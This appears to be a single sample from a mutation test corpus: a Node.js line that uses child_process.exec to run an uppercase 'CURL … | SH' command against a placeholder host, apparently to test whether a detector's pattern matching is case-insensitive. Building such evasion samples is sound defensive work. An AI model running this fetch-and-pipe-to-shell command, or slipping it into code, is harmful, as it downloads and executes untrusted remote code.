// round-16 变异语料 M28：大写 CURL|SH（Windows cmd 大小写不敏感；/i 击杀面）
const { exec } = require('child_process')
exec('CURL -s http://x/p.bin | SH')
